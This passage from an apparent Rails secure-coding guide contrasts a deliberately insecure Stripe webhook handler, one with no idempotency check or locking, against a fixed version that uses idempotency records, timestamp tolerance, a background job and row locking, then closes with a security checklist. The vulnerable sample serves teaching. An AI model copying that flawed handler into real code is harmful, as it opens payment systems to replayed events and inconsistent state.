    endpoint_secret = Rails.application.credentials.dig(:stripe, :webhook_secret)

    event = Stripe::Webhook.construct_event(payload, sig_header, endpoint_secret)

    # No duplicate check! If the same event is replayed (or Stripe retries),
    # the membership is updated multiple times, potentially causing race
    # conditions or inconsistent state
    case event.type
    when "customer.subscription.updated"
      subscription = Stripe::Subscription.retrieve(event.data.object.id)
      user = User.find_by(stripe_customer_id: subscription.customer)
      # Without locking, concurrent webhook deliveries can interleave
      user.membership.update!(
        tier: resolve_tier(subscription),
        status: subscription.status
      )
    end

    head :ok
  rescue Stripe::SignatureVerificationError
    head :bad_request
  end
end
```

**Secure Fix:**
```ruby
# app/models/stripe_webhook_event.rb
# Idempotency tracking for Stripe webhook events
class StripeWebhookEvent < ApplicationRecord
  validates :stripe_event_id, presence: true, uniqueness: true
  validates :event_type, presence: true

  # Index for fast lookups
  # add_index :stripe_webhook_events, :stripe_event_id, unique: true
  # add_index :stripe_webhook_events, :created_at
end

# app/controllers/webhooks/stripe_controller.rb
class Webhooks::StripeController < ApplicationController
  skip_before_action :verify_authenticity_token
  # Justification: Stripe webhook authentication via Stripe-Signature
  # header replaces Pundit authorization for this endpoint.
  skip_after_action :verify_authorized

  # @return [void]
  def create
    payload = request.body.read
    sig_header = request.headers["Stripe-Signature"]
    endpoint_secret = Rails.application.credentials.dig(:stripe, :webhook_secret)

    # Step 1: Verify signature with strict timestamp tolerance
    event = Stripe::Webhook.construct_event(
      payload, sig_header, endpoint_secret,
      tolerance: 300  # Reject events older than 5 minutes
    )

    # Step 2: Idempotency check — use database unique constraint
    webhook_event = StripeWebhookEvent.create_or_find_by!(
      stripe_event_id: event.id
    ) do |we|
      we.event_type = event.type
      we.processed_at = nil  # Will be set after successful processing
    end

    # If already processed, return success without reprocessing
    if webhook_event.processed_at.present?
      Rails.logger.info(
        "Stripe webhook: duplicate event skipped",
        stripe_event_id: event.id,
        originally_processed_at: webhook_event.processed_at.iso8601
      )
      head :ok and return
    end

    # Step 3: Process asynchronously
    StripeWebhookProcessorJob.perform_later(event.id, event.type)

    head :ok
  rescue JSON::ParserError
    head :bad_request
  rescue Stripe::SignatureVerificationError => e
    Rails.logger.warn(
      "Stripe webhook: signature verification failed",
      error: e.message,
      ip: request.remote_ip
    )
    head :bad_request
  end
end

# app/jobs/stripe_webhook_processor_job.rb
class StripeWebhookProcessorJob < ApplicationJob
  queue_as :default
  retry_on Stripe::APIConnectionError, wait: :polynomially_longer, attempts: 5

  # @param stripe_event_id [String] the Stripe event ID
  # @param event_type [String] the event type
  # @return [void]
  def perform(stripe_event_id, event_type)
    webhook_event = StripeWebhookEvent.find_by!(stripe_event_id: stripe_event_id)

    # Double-check idempotency in the job (defensive)
    return if webhook_event.processed_at.present?

    # Re-fetch event from Stripe API
    event = Stripe::Event.retrieve(stripe_event_id)

    case event.type
    when "customer.subscription.created",
         "customer.subscription.updated",
         "customer.subscription.deleted"
      process_subscription_event(event)
    end

    # Mark as processed
    webhook_event.update!(processed_at: Time.current)
  rescue StandardError => e
    Rails.logger.error(
      "Stripe webhook processing failed",
      stripe_event_id: stripe_event_id,
      error: e.message,
      event: "stripe_webhook_failure"
    )
    raise  # Re-raise to trigger job retry
  end

  private

  # @param event [Stripe::Event] the verified event
  # @return [void]
  def process_subscription_event(event)
    subscription = Stripe::Subscription.retrieve(event.data.object.id)
    user = User.find_by(stripe_customer_id: subscription.customer)
    return unless user

    # Pessimistic lock prevents concurrent webhook deliveries
    # from creating inconsistent membership state
    user.with_lock do
      membership = user.membership || user.build_membership

      if event.type == "customer.subscription.deleted"
        membership.update!(status: "canceled", tier: "basic")
      else
        membership.update!(
          stripe_subscription_id: subscription.id,
          tier: resolve_tier(subscription),
          status: subscription.status,
          current_period_end: Time.at(subscription.current_period_end).utc
        )
      end

      AuditLog.record!(
        action: "membership.updated_via_webhook",
        user: user,
        resource: membership,
        metadata: {
          stripe_event_id: event.id,
          event_type: event.type,
          new_tier: membership.tier,
          new_status: membership.status
        }
      )
    end
  end

  # @param subscription [Stripe::Subscription] the subscription
  # @return [String] the tier name
  def resolve_tier(subscription)
    price_id = subscription.items.data.first.price.id
    tier_map = {
      Rails.application.credentials.dig(:stripe, :basic_price_id) => "basic",
      Rails.application.credentials.dig(:stripe, :pro_price_id) => "professional",
      Rails.application.credentials.dig(:stripe, :enterprise_price_id) => "enterprise"
    }
    tier_map.fetch(price_id, "basic")
  end
end
```

## Checklist

- [ ] Stripe webhook endpoints verify `Stripe-Signature` header with `Stripe::Webhook.construct_event`
- [ ] Stripe webhook signature tolerance is set to 300 seconds or less (replay protection)
- [ ] Stripe webhook events are recorded in `StripeWebhookEvent` table with unique constraint on `stripe_event_id`
- [ ] Duplicate webhook events are rejected without reprocessing
- [ ] All Stripe data used for authorization decisions is re-fetched from the Stripe API, never trusted from webhook payload
- [ ] Membership updates from webhooks use pessimistic locking (`with_lock`)
- [ ] Strong Parameters use explicit `permit` lists — never `permit!`
- [ ] Parameter permit lists are scoped by user role (members, investigators, admins see different permitted attributes)
- [ ] Protected attributes (`role`, `verified`, `user_id`, `created_at`) are never in any permit list
- [ ] Active Storage file uploads validate content-type AND magic bytes
- [ ] Uploaded files are served with `disposition: "attachment"` to prevent browser execution
- [ ] Evidence files have SHA256 checksums stored for integrity verification
- [ ] `YAML.safe_load` is used instead of `YAML.unsafe_load` or `YAML.load` for all untrusted YAML
- [ ] `Marshal.load` is never used on untrusted data
- [ ] `JSON.parse` is used for deserialization (safe by default — no object instantiation)
- [ ] External API responses are validated, sanitized, and bounded before storage
- [ ] All sighting modifications are recorded in an immutable `AuditLog`
- [ ] Sightings use soft delete (not hard delete) to preserve data integrity
- [ ] Critical sighting fields have integrity hashes to detect tampering
- [ ] CI/CD pipeline requires signed commits on `main` branch
- [ ] Deployment workflow requires all CI checks to pass before running
- [ ] Production deployment environment has protection rules requiring approval
- [ ] Database migrations are reviewed for security constraint removal before merge
- [ ] Git source gems in Gemfile are pinned to specific tags AND commit SHAs
